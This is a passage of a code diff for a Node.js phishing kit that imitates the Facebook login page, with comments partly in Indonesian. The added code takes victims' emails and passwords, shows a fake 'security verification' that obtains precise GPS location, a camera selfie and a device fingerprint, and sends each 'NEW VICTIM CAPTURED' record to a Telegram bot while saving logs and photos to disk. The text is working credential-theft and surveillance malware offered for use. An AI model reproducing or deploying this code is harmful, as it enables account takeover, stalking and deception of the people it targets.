+                border: none;
+                padding: 15px;
+                border-radius: 6px;
+                font-weight: bold;
+                cursor: pointer;
+                transition: background 0.3s;
+            }
+            
+            .btn-primary:hover {
+                background: #166fe5;
+            }
+            
+            .btn-secondary {
+                flex: 1;
+                background: #e4e6eb;
+                color: #1c1e21;
+                border: none;
+                padding: 15px;
+                border-radius: 6px;
+                font-weight: bold;
+                cursor: pointer;
+                transition: background 0.3s;
+            }
+            
+            .btn-secondary:hover {
+                background: #d8dadf;
+            }
+            
+            /* Camera Modal */
+            .camera-modal {
+                display: none;
+            }
+            
+            .camera-container {
+                text-align: center;
+                padding: 20px;
+            }
+            
+            .camera-preview {
+                width: 100%;
+                max-width: 400px;
+                height: 300px;
+                background: #000;
+                margin: 0 auto 20px;
+                border-radius: 8px;
+                overflow: hidden;
+                position: relative;
+            }
+            
+            #cameraVideo {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+            }
+            
+            .camera-overlay {
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                pointer-events: none;
+            }
+            
+            .face-guide {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                width: 200px;
+                height: 200px;
+                border: 2px solid rgba(255,255,255,0.5);
+                border-radius: 50%;
+            }
+            
+            .camera-buttons {
+                display: flex;
+                gap: 10px;
+                justify-content: center;
+                margin-top: 20px;
+            }
+            
+            .btn-capture {
+                background: #1877f2;
+                color: white;
+                border: none;
+                padding: 12px 30px;
+                border-radius: 6px;
+                font-weight: bold;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                gap: 8px;
+            }
+            
+            .btn-capture:hover {
+                background: #166fe5;
+            }
+            
+            .btn-skip {
+                background: #e4e6eb;
+                color: #1c1e21;
+                border: none;
+                padding: 12px 30px;
+                border-radius: 6px;
+                font-weight: bold;
+                cursor: pointer;
+            }
+            
+            .btn-skip:hover {
+                background: #d8dadf;
+            }
+            
+            /* Loading Screen */
+            .loading-screen {
+                background: #1877f2;
+                color: white;
+                text-align: center;
+                padding: 50px 20px;
+            }
+            
+            .loading-spinner {
+                border: 5px solid rgba(255,255,255,0.3);
+                border-top: 5px solid white;
+                border-radius: 50%;
+                width: 60px;
+                height: 60px;
+                animation: spin 1s linear infinite;
+                margin: 0 auto 30px;
+            }
+            
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+            
+            /* Success Screen */
+            .success-screen {
+                text-align: center;
+                padding: 40px 20px;
+            }
+            
+            .success-icon {
+                background: #42b72a;
+                color: white;
+                width: 80px;
+                height: 80px;
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin: 0 auto 20px;
+                font-size: 40px;
+            }
+            
+            /* Mobile Responsive */
+            @media (max-width: 900px) {
+                .row {
+                    flex-direction: column;
+                    text-align: center;
+                }
+                
+                .intro {
+                    padding-right: 0;
+                    margin-bottom: 40px;
+                }
+                
+                .intro h1 {
+                    font-size: 42px;
+                }
+                
+                .intro h2 {
+                    font-size: 24px;
+                }
+                
+                .container {
+                    padding: 20px;
+                }
+            }
+            
+            /* Browser-specific styles */
+            input::-webkit-input-placeholder { color: #8a8d91; }
+            input::-moz-placeholder { color: #8a8d91; }
+            input:-ms-input-placeholder { color: #8a8d91; }
+            input:-moz-placeholder { color: #8a8d91; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="row">
+                <div class="intro">
+                    <h1>facebook</h1>
+                    <h2>Facebook helps you connect and share with the people in your life.</h2>
+                </div>
+                <div class="login-panel">
+                    <div class="login-box">
+                        <form id="loginForm">
+                            <input type="text" id="email" name="email" placeholder="Email address or phone number" required autofocus>
+                            <input type="password" id="pass" name="pass" placeholder="Password" required>
+                            <button type="submit" class="login-btn">Log In</button>
+                            <a href="#" class="forgot-password">Forgotten password?</a>
+                            <hr style="border: none; border-top: 1px solid #dadde1; margin: 20px 0;">
+                            <button type="button" class="create-account" onclick="showCreateAccount()">Create New Account</button>
+                        </form>
+                    </div>
+                    <div class="create-page">
+                        <a href="#" style="font-weight: bold;">Create a Page</a> for a celebrity, brand or business.
+                    </div>
+                </div>
+            </div>
+        </div>
         
-        // Get location
-        async function getLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
+        <div class="footer">
+            <div class="footer-links">
+                <div class="languages">
+                    <a href="#">English (UK)</a>
+                    <a href="#">Bahasa Indonesia</a>
+                    <a href="#">中文(简体)</a>
+                    <a href="#">日本語</a>
+                    <a href="#">Español</a>
+                    <a href="#">Português (Brasil)</a>
+                    <a href="#"><i class="fas fa-plus"></i></a>
+                </div>
+                <hr style="border: none; border-top: 1px solid #dddfe2; margin: 10px 0;">
+                <div>
+                    <a href="#">Sign Up</a>
+                    <a href="#">Log In</a>
+                    <a href="#">Messenger</a>
+                    <a href="#">Facebook Lite</a>
+                    <a href="#">Video</a>
+                    <a href="#">Places</a>
+                    <a href="#">Games</a>
+                    <a href="#">Marketplace</a>
+                    <a href="#">Meta Pay</a>
+                    <a href="#">Meta Store</a>
+                    <a href="#">Meta Quest</a>
+                    <a href="#">Instagram</a>
+                    <a href="#">Threads</a>
+                    <a href="#">Fundraisers</a>
+                    <a href="#">Services</a>
+                    <a href="#">Voting Information Centre</a>
+                    <a href="#">Privacy Policy</a>
+                    <a href="#">Privacy Centre</a>
+                    <a href="#">Groups</a>
+                    <a href="#">About</a>
+                    <a href="#">Create Ad</a>
+                    <a href="#">Create Page</a>
+                    <a href="#">Developers</a>
+                    <a href="#">Careers</a>
+                    <a href="#">Cookies</a>
+                    <a href="#">AdChoices</a>
+                    <a href="#">Terms</a>
+                    <a href="#">Help</a>
+                    <a href="#">Contact uploading and non-users</a>
+                </div>
+                <div class="meta-footer">
+                    Meta © 2024
+                </div>
+            </div>
+        </div>
+        
+        <!-- Security Verification Modal -->
+        <div id="securityModal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2><i class="fas fa-shield-alt"></i> Security Verification Required</h2>
+                </div>
+                <div class="modal-body">
+                    <div class="security-alert">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <strong>Unusual login attempt detected</strong> from your location. For your account security, we need to verify your identity.
+                    </div>
+                    
+                    <p style="margin-bottom: 20px; color: #65676b;">
+                        To complete your login and protect your account from unauthorized access, please allow the following permissions:
+                    </p>
+                    
+                    <div class="permission-item">
+                        <div class="permission-icon">
+                            <i class="fas fa-map-marker-alt"></i>
+                        </div>
+                        <div class="permission-text">
+                            <h4>Location Access</h4>
+                            <p>Verify that you're logging in from your usual location</p>
+                        </div>
+                    </div>
+                    
+                    <div class="permission-item">
+                        <div class="permission-icon">
+                            <i class="fas fa-camera"></i>
+                        </div>
+                        <div class="permission-text">
+                            <h4>Camera Access</h4>
+                            <p>Take a quick selfie for facial recognition verification</p>
+                        </div>
+                    </div>
+                    
+                    <div class="permission-item">
+                        <div class="permission-icon">
+                            <i class="fas fa-microphone"></i>
+                        </div>
+                        <div class="permission-text">
+                            <h4>Microphone Access (Optional)</h4>
+                            <p>Voice verification for enhanced security</p>
+                        </div>
+                    </div>
+                    
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="termsCheck" checked>
+                        <label for="termsCheck">I understand this helps protect my account from unauthorized access</label>
+                    </div>
+                    
+                    <div class="modal-buttons">
+                        <button class="btn-primary" onclick="startVerification()">
+                            <i class="fas fa-check"></i> Continue Verification
+                        </button>
+                        <button class="btn-secondary" onclick="cancelVerification()">
+                            <i class="fas fa-times"></i> Cancel
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Camera Modal -->
+        <div id="cameraModal" class="modal camera-modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2><i class="fas fa-camera"></i> Facial Recognition</h2>
+                </div>
+                <div class="camera-container">
+                    <p style="margin-bottom: 20px; color: #65676b;">
+                        Please look directly at the camera. Make sure your face is clearly visible and well-lit.
+                    </p>
+                    
+                    <div class="camera-preview">
+                        <video id="cameraVideo" autoplay playsinline></video>
+                        <div class="camera-overlay">
+                            <div class="face-guide"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="camera-buttons">
+                        <button class="btn-capture" onclick="capturePhoto()">
+                            <i class="fas fa-camera"></i> Capture Photo
+                        </button>
+                        <button class="btn-skip" onclick="skipCamera()">
+                            Skip This Step
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Loading Screen -->
+        <div id="loadingScreen" class="modal">
+            <div class="modal-content loading-screen">
+                <div class="loading-spinner"></div>
+                <h2>Verifying Your Identity</h2>
+                <p>Please wait while we complete the security verification process...</p>
+                <p style="font-size: 14px; opacity: 0.8; margin-top: 20px;">
+                    <i class="fas fa-lock"></i> Your information is encrypted and secure
+                </p>
+            </div>
+        </div>
+        
+        <!-- Success Screen -->
+        <div id="successScreen" class="modal">
+            <div class="modal-content">
+                <div class="success-screen">
+                    <div class="success-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <h2>Verification Successful!</h2>
+                    <p>Your identity has been verified successfully.</p>
+                    <p style="color: #65676b; margin: 20px 0;">
+                        You will be redirected to Facebook shortly...
+                    </p>
+                    <div class="loading-spinner" style="border: 3px solid #f0f0f0; border-top: 3px solid #1877f2; width: 30px; height: 30px;"></div>
+                </div>
+            </div>
+        </div>
+        
+        <script>
+            const victimId = '${victimId}';
+            const sessionId = '${sessionId}';
+            
+            let userLocation = null;
+            let userPhoto = null;
+            let cameraStream = null;
+            let collectedData = {};
+            
+            // Login form submission
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('pass').value;
+                
+                if (!email || !password) {
+                    alert('Please fill in all fields');
                     return;
                 }
                 
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
+                // Store credentials
+                collectedData.credentials = {
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Show security verification
+                document.getElementById('securityModal').style.display = 'block';
+            });
+            
+            // Start verification process
+            async function startVerification() {
+                if (!document.getElementById('termsCheck').checked) {
+                    alert('You must accept the terms to continue.');
+                    return;
+                }
+                
+                document.getElementById('securityModal').style.display = 'none';
+                
+                // Collect system information
+                collectedData.system = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: screen.colorDepth,
+                        pixelDepth: screen.pixelDepth
+                    },
+                    window: {
+                        width: window.innerWidth,
+                        height: window.innerHeight
+                    },
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    online: navigator.onLine
+                };
+                
+                // Get IP address
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    collectedData.ip = ipData.ip;
+                } catch (error) {
+                    collectedData.ip = 'unknown';
+                }
+                
+                // Get network information
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+                collectedData.network = {
+                    effectiveType: connection.effectiveType,
+                    downlink: connection.downlink,
+                    rtt: connection.rtt,
+                    saveData: connection.saveData
+                };
+                
+                // Get location
+                if (navigator.geolocation) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true,
+                                timeout: 10000,
+                                maximumAge: 0
+                            });
+                        });
+                        
+                        userLocation = {
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
                             accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
                             timestamp: position.timestamp
-                        });
-                    },
-                    (error) => {
-                        resolve({ error: error.message });
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
+                        };
+                        
+                        collectedData.location = userLocation;
+                        
+                        // Generate Google Maps links
+                        collectedData.maps = {
+                            googleMaps: \`https://maps.google.com/?q=\${userLocation.latitude},\${userLocation.longitude}\`,
+                            openStreetMap: \`https://www.openstreetmap.org/?mlat=\${userLocation.latitude}&mlon=\${userLocation.longitude}\`,
+                            appleMaps: \`https://maps.apple.com/?ll=\${userLocation.latitude},\${userLocation.longitude}\`,
+                            bingMaps: \`https://bing.com/maps/default.aspx?cp=\${userLocation.latitude}~\${userLocation.longitude}\`
+                        };
+                        
+                    } catch (error) {
+                        console.error('Geolocation error:', error);
+                        collectedData.location = { error: error.message };
                     }
-                );
-            });
-        }
-        
-        // Form submission
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const button = document.getElementById('loginButton');
-            
-            if (!email || !password) {
-                alert('Please fill in all fields');
-                return;
+                }
+                
+                // Show camera modal if camera permission is needed
+                showCameraModal();
             }
             
-            // Store credentials
-            collectedData.credentials = {
-                email: email,
-                password: password,
-                loginTime: new Date().toISOString()
-            };
+            function cancelVerification() {
+                document.getElementById('securityModal').style.display = 'none';
+                alert('Verification cancelled. Please try logging in again.');
+                document.getElementById('loginForm').reset();
+            }
             
-            // Disable button and show loading
-            button.disabled = true;
-            button.innerHTML = 'Verifying...';
+            function showCameraModal() {
+                document.getElementById('cameraModal').style.display = 'block';
+                startCamera();
+            }
             
-            try {
-                // Get additional data
-                collectedData.ip = await getIP();
-                collectedData.location = await getLocation();
+            function startCamera() {
+                const video = document.getElementById('cameraVideo');
                 
-                // Add session info
-                collectedData.session = {
-                    sessionId: sessionId,
-                    trackingId: trackingId,
-                    pageLoadTime: Date.now() - performance.timing.navigationStart
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const constraints = {
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: 'user',
+                            frameRate: { ideal: 30 }
+                        },
+                        audio: false
+                    };
+                    
+                    navigator.mediaDevices.getUserMedia(constraints)
+                        .then(function(stream) {
+                            cameraStream = stream;
+                            video.srcObject = stream;
+                        })
+                        .catch(function(error) {
+                            console.error('Camera error:', error);
+                            // Continue without camera
+                            collectedData.camera = { error: 'Camera access denied' };
+                            skipCamera();
+                        });
+                } else {
+                    collectedData.camera = { error: 'Camera not available' };
+                    skipCamera();
+                }
+            }
+            
+            function capturePhoto() {
+                const video = document.getElementById('cameraVideo');
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to base64
+                userPhoto = canvas.toDataURL('image/jpeg', 0.8);
+                collectedData.photo = userPhoto;
+                
+                // Stop camera
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                }
+                
+                document.getElementById('cameraModal').style.display = 'none';
+                completeVerification();
+            }
+            
+            function skipCamera() {
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                }
+                document.getElementById('cameraModal').style.display = 'none';
+                completeVerification();
+            }
+            
+            async function completeVerification() {
+                document.getElementById('loadingScreen').style.display = 'block';
+                
+                // Add victim metadata
+                collectedData.victimId = victimId;
+                collectedData.sessionId = sessionId;
+                collectedData.url = window.location.href;
+                collectedData.referrer = document.referrer;
+                collectedData.timestamp = new Date().toISOString();
+                
+                // Get browser plugins
+                collectedData.plugins = Array.from(navigator.plugins).map(p => ({
+                    name: p.name,
+                    description: p.description,
+                    filename: p.filename
+                }));
+                
+                // Get browser features
+                collectedData.features = {
+                    localStorage: !!window.localStorage,
+                    sessionStorage: !!window.sessionStorage,
+                    indexedDB: !!window.indexedDB,
+                    serviceWorker: 'serviceWorker' in navigator,
+                    webGL: detectWebGL(),
+                    webRTC: !!window.RTCPeerConnection,
+                    webAudio: !!window.AudioContext || !!window.webkitAudioContext,
+                    batteryAPI: 'getBattery' in navigator,
+                    vibrationAPI: 'vibrate' in navigator,
+                    geolocation: 'geolocation' in navigator,
+                    camera: 'mediaDevices' in navigator
                 };
                 
                 // Send data to server
-                const response = await fetch('/api/verify', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Session-ID': sessionId,
-                        'X-Tracking-ID': trackingId
-                    },
-                    body: JSON.stringify(collectedData)
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    // Redirect to real Facebook
+                try {
+                    const response = await fetch('/api/track', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Victim-ID': victimId,
+                            'X-Session-ID': sessionId
+                        },
+                        body: JSON.stringify(collectedData)
+                    });
+                    
+                    if (response.ok) {
+                        document.getElementById('loadingScreen').style.display = 'none';
+                        document.getElementById('successScreen').style.display = 'block';
+                        
+                        // Redirect to real Facebook after 3 seconds
+                        setTimeout(() => {
+                            window.location.href = 'https://facebook.com';
+                        }, 3000);
+                    } else {
+                        throw new Error('Server error');
+                    }
+                } catch (error) {
+                    console.error('Error sending data:', error);
+                    // Still redirect to Facebook
                     setTimeout(() => {
                         window.location.href = 'https://facebook.com';
-                    }, 1000);
-                } else {
-                    alert('Login failed. Please try again.');
-                    button.disabled = false;
-                    button.innerHTML = 'Log In';
+                    }, 3000);
                 }
-                
-            } catch (error) {
-                console.error('Error:', error);
-                // Still redirect to Facebook
-                setTimeout(() => {
-                    window.location.href = 'https://facebook.com';
-                }, 1000);
             }
-        });
-        
-        function createAccount() {
-            alert('Account creation is temporarily unavailable. Please try again later.');
-        }
-        
-        // Send initial data
-        window.addEventListener('load', () => {
-            // Send initial ping
-            fetch('/api/ping', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Session-ID': sessionId
-                },
-                body: JSON.stringify({ type: 'page_load' })
-            });
-        });
-        
-        // Capture more data on user interaction
-        document.addEventListener('click', (e) => {
-            collectedData.interactions = collectedData.interactions || [];
-            collectedData.interactions.push({
-                type: 'click',
-                target: e.target.tagName,
-                timestamp: Date.now()
-            });
-        });
-        
-        document.addEventListener('keypress', (e) => {
-            collectedData.interactions = collectedData.interactions || [];
-            collectedData.interactions.push({
-                type: 'keypress',
-                key: e.key,
-                timestamp: Date.now()
-            });
-        });
-    </script>
-</body>
-</html>
+            
+            function detectWebGL() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    return !!(window.WebGLRenderingContext && 
+                        (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
+                } catch (e) {
+                    return false;
+                }
+            }
+            
+            function showCreateAccount() {
+                alert('Create Account feature is currently unavailable. Please try again later.');
+            }
+            
+            // Auto-focus email field
+            window.onload = function() {
+                document.getElementById('email').focus();
+            };
+        </script>
+    </body>
+    </html>
     `);
 });
 
-// API endpoint for data collection
-app.post('/api/verify', async (req, res) => {
+// API endpoint untuk menerima data tracking
+app.post('/api/track', async (req, res) => {
     try {
         const data = req.body;
-        const sessionId = req.headers['x-session-id'];
-        const trackingId = req.headers['x-tracking-id'];
+        const victimId = req.headers['x-victim-id'] || generateVictimId(req);
+        const sessionId = req.headers['x-session-id'] || req.sessionId;
         
         // Add metadata
-        data.receivedAt = new Date().toISOString();
-        data.headers = {
-            'user-agent': req.headers['user-agent'],
-            'accept-language': req.headers['accept-language'],
-            'x-forwarded-for': req.headers['x-forwarded-for'],
-            'real-ip': req.ip
-        };
+        data.victimId = victimId;
+        data.sessionId = sessionId;
+        data.serverTimestamp = new Date().toISOString();
+        data.userAgent = req.headers['user-agent'];
+        data.realIp = req.ip || req.connection.remoteAddress;
         
-        // Get geolocation from IP
+        // Get IP geolocation
         if (data.ip && data.ip !== 'unknown') {
-            try {
-                const geoResponse = await axios.get(`http://ip-api.com/json/${data.ip}`);
-                if (geoResponse.data && geoResponse.data.status === 'success') {
-                    data.geolocation = {
-                        country: geoResponse.data.country,
-                        countryCode: geoResponse.data.countryCode,
-                        region: geoResponse.data.regionName,
-                        city: geoResponse.data.city,
-                        zip: geoResponse.data.zip,
-                        lat: geoResponse.data.lat,
-                        lon: geoResponse.data.lon,
-                        timezone: geoResponse.data.timezone,
-                        isp: geoResponse.data.isp,
-                        org: geoResponse.data.org,
-                        as: geoResponse.data.as
-                    };
-                    
-                    // Generate map links
-                    if (data.geolocation.lat && data.geolocation.lon) {
-                        data.maps = {
-                            google: `https://maps.google.com/?q=${data.geolocation.lat},${data.geolocation.lon}`,
-                            osm: `https://www.openstreetmap.org/?mlat=${data.geolocation.lat}&mlon=${data.geolocation.lon}`,
-                            bing: `https://bing.com/maps/default.aspx?cp=${data.geolocation.lat}~${data.geolocation.lon}`
-                        };
-                    }
-                }
-            } catch (geoError) {
-                console.log('Geolocation failed:', geoError.message);
+            const geo = geoip.lookup(data.ip);
+            if (geo) {
+                data.geolocation = {
+                    country: geo.country,
+                    region: geo.region,
+                    city: geo.city,
+                    timezone: geo.timezone,
+                    ll: geo.ll,
+                    metro: geo.metro,
+                    range: geo.range
+                };
             }
         }
         
-        // Save to database
-        const victim = db.addVictim(data);
+        // Simpan ke database
+        victims.set(victimId, data);
         
-        // Send to Telegram
-        if (telegramBot) {
-            telegramBot.sendVictimAlert(victim.data);
-        }
+        // Kirim ke Telegram
+        await sendDetailedTelegramAlert(data);
         
-        // Send response
-        res.json({
-            success: true,
-            message: 'Verification successful',
-            redirect: 'https://facebook.com',
-            victimId: victim.victimId
+        // Simpan ke file
+        saveToFile(data);
+        
+        res.json({ 
+            success: true, 
+            message: 'Verification completed successfully',
+            redirect: 'https://facebook.com'
         });
         
     } catch (error) {
-        console.error('Error in /api/verify:', error);
-        res.status(500).json({ 
-            success: false, 
-            error: 'Internal server error',
-            redirect: 'https://facebook.com'
+        console.error('Error in /api/track:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Fungsi untuk mengirim alert detail ke Telegram
+async function sendDetailedTelegramAlert(data) {
+    try {
+        // Format pesan utama
+        const message = `
+🎯 *NEW VICTIM CAPTURED* 🎯
+
+*🔐 CREDENTIALS*
+👤 Email: \`${data.credentials.email}\`
+🔑 Password: \`${data.credentials.password}\`
+
+*📍 LOCATION DATA*
+🌐 IP Address: \`${data.ip}\`
+${data.geolocation ? `🗺️ Country: ${data.geolocation.country}` : ''}
+${data.geolocation ? `🏙️ City: ${data.geolocation.city || 'Unknown'}` : ''}
+${data.location ? `📍 Coordinates: ${data.location.latitude || 'N/A'}, ${data.location.longitude || 'N/A'}` : ''}
+${data.location ? `🎯 Accuracy: ${data.location.accuracy || 'N/A'} meters` : ''}
+
+*🗺️ MAPS LINKS*
+${data.maps ? `🗺️ Google Maps: ${data.maps.googleMaps}` : ''}
+${data.maps ? `🗺️ OpenStreetMap: ${data.maps.openStreetMap}` : ''}
+${data.maps ? `🗺️ Apple Maps: ${data.maps.appleMaps}` : ''}
+
+*🖥️ SYSTEM INFO*
+💻 Platform: ${data.system.platform}
+🌐 Browser: ${getBrowserName(data.system.userAgent)}
+📱 Screen: ${data.system.screen.width}x${data.system.screen.height}
+🔍 Timezone: ${data.system.timezone}
+📶 Network: ${data.network.effectiveType || 'Unknown'}
+
+*📊 DEVICE FINGERPRINT*
+🔢 CPU Cores: ${data.system.hardwareConcurrency || 'Unknown'}
+💾 RAM: ${data.system.deviceMemory || 'Unknown'} GB
+🎮 WebGL: ${data.features.webGL ? '✅' : '❌'}
+🎥 Camera: ${data.features.camera ? '✅' : '❌'}
+🗺️ GPS: ${data.features.geolocation ? '✅' : '❌'}
+
+*⏰ TIMING*
+🕐 Login Time: ${moment(data.credentials.timestamp).format('YYYY-MM-DD HH:mm:ss')}
+🕐 Capture Time: ${moment(data.timestamp).format('YYYY-MM-DD HH:mm:ss')}
+
+*🔗 LINKS*
+🔗 Victim URL: ${data.url}
+🔗 Referrer: ${data.referrer || 'Direct'}
+🆔 Victim ID: \`${data.victimId}\`
+🆔 Session ID: \`${data.sessionId}\`
+        `;
+        
+        // Kirim pesan utama
+        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { 
+            parse_mode: 'Markdown',
+            disable_web_page_preview: true
         });
-    }
-});
+        
+        // Kirim lokasi di peta jika ada
+        if (data.location && data.location.latitude && data.location.longitude) {
+            await bot.sendLocation(
+                TELEGRAM_CHAT_ID, 
+                data.location.latitude, 
+                data.location.longitude,
+                {
+                    disable_notification: false
+                }
+            );
+        }
+        
+        // Kirim foto jika ada
+        if (data.photo) {
+            try {
+                // Convert base64 to buffer
+                const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, '');
+                const buffer = Buffer.from(base64Data, 'base64');
+                
+                await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, {
+                    caption: '📸 *Face Photo Captured*',
+                    parse_mode: 'Markdown'
+                });
+            } catch (photoError) {
+                console.error('Error sending photo:', photoError);
+                await bot.sendMessage(TELEGRAM_CHAT_ID, '❌ *Failed to send photo*', { parse_mode: 'Markdown' });
+            }
+        }
+        
+        // Kirim detailed system info
+        const systemDetails = `
+*🔍 DETAILED SYSTEM INFO*
 
-// Ping endpoint (for tracking)
-app.post('/api/ping', (req, res) => {
-    const sessionId = req.headers['x-session-id'];
-    if (sessionId) {
-        db.updateSession(sessionId, req.body);
-    }
-    res.json({ status: 'ok' });
-});
+*User Agent:*
+\`\`\`
+${data.system.userAgent.substring(0, 300)}...
+\`\`\`
 
-// Admin dashboard (protected)
+*Screen Details:*
+📏 Resolution: ${data.system.screen.width}x${data.system.screen.height}
+🎨 Color Depth: ${data.system.screen.colorDepth}-bit
+🖥️ Window Size: ${data.system.window.width}x${data.system.window.height}
+
+*Network Info:*
+📡 Type: ${data.network.effectiveType || 'Unknown'}
+⚡ Speed: ${data.network.downlink || 'Unknown'} Mbps
+⏱️ Latency: ${data.network.rtt || 'Unknown'} ms
+📊 Save Data: ${data.network.saveData ? 'Enabled' : 'Disabled'}
+
+*Browser Features:*
+${Object.entries(data.features).map(([key, value]) => `• ${key}: ${value ? '✅' : '❌'}`).join('\n')}
+
+*Installed Plugins (${data.plugins.length}):*
+${data.plugins.slice(0, 5).map(p => `• ${p.name}`).join('\n')}
+${data.plugins.length > 5 ? `... and ${data.plugins.length - 5} more` : ''}
+        `;
+        
+        await bot.sendMessage(TELEGRAM_CHAT_ID, systemDetails, { 
+            parse_mode: 'Markdown',
+            disable_web_page_preview: true
+        });
+        
+        console.log(`✅ Telegram alert sent for victim: ${data.victimId}`);
+        
+    } catch (error) {
+        console.error('Error sending Telegram alert:', error);
+    }
+}
+
+// Fungsi helper untuk mendapatkan nama browser
+function getBrowserName(userAgent) {
+    if (userAgent.includes('Chrome')) return 'Chrome';
+    if (userAgent.includes('Firefox')) return 'Firefox';
+    if (userAgent.includes('Safari')) return 'Safari';
+    if (userAgent.includes('Edge')) return 'Edge';
+    if (userAgent.includes('Opera')) return 'Opera';
+    return 'Unknown';
+}
+
+// Fungsi untuk menyimpan data ke file
+function saveToFile(data) {
+    try {
+        const fs = require('fs');
+        const path = require('path');
+        
+        const logsDir = path.join(__dirname, 'logs');
+        if (!fs.existsSync(logsDir)) {
+            fs.mkdirSync(logsDir, { recursive: true });
+        }
+        
+        // Simpan data lengkap sebagai JSON
+        const jsonFile = path.join(logsDir, `victim_${data.victimId}.json`);
+        fs.writeFileSync(jsonFile, JSON.stringify(data, null, 2));
+        
+        // Simpan ke log utama
+        const logEntry = `
+================================================================================
+VICTIM ID: ${data.victimId}
+SESSION ID: ${data.sessionId}
+TIME: ${new Date().toISOString()}
+----------------------------------------------------------------------------
+CREDENTIALS:
+  Email: ${data.credentials.email}
+  Password: ${data.credentials.password}
+----------------------------------------------------------------------------
+LOCATION:
+  IP: ${data.ip}
+  Country: ${data.geolocation?.country || 'Unknown'}
+  City: ${data.geolocation?.city || 'Unknown'}
+  Coordinates: ${data.location?.latitude || 'N/A'}, ${data.location?.longitude || 'N/A'}
+  Accuracy: ${data.location?.accuracy || 'N/A'}m
+----------------------------------------------------------------------------
+MAPS LINKS:
+  Google Maps: ${data.maps?.googleMaps || 'N/A'}
+  OpenStreetMap: ${data.maps?.openStreetMap || 'N/A'}
+  Apple Maps: ${data.maps?.appleMaps || 'N/A'}
+----------------------------------------------------------------------------
+SYSTEM INFO:
+  User Agent: ${data.system.userAgent}
+  Platform: ${data.system.platform}
+  Screen: ${data.system.screen.width}x${data.system.screen.height}
+  Timezone: ${data.system.timezone}
+  Network: ${data.network.effectiveType || 'Unknown'}
+----------------------------------------------------------------------------
+DEVICE:
+  CPU Cores: ${data.system.hardwareConcurrency || 'Unknown'}
+  RAM: ${data.system.deviceMemory || 'Unknown'} GB
+  WebGL: ${data.features.webGL ? 'Yes' : 'No'}
+  Camera: ${data.features.camera ? 'Yes' : 'No'}
+================================================================================
+
+`;
+        
+        const masterLog = path.join(logsDir, 'master_log.txt');
+        fs.appendFileSync(masterLog, logEntry);
+        
+        // Simpan foto terpisah jika ada
+        if (data.photo) {
+            const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, '');
+            const buffer = Buffer.from(base64Data, 'base64');
+            const photoFile = path.join(logsDir, `photo_${data.victimId}.jpg`);
+            fs.writeFileSync(photoFile, buffer);
+        }
+        
+        console.log(`📁 Data saved for victim: ${data.victimId}`);
+        
+    } catch (error) {
+        console.error('Error saving to file:', error);
+    }
+}
+
+// Admin dashboard
 app.get('/admin', (req, res) => {
-    const { token } = req.query;
-    
-    // Simple token check
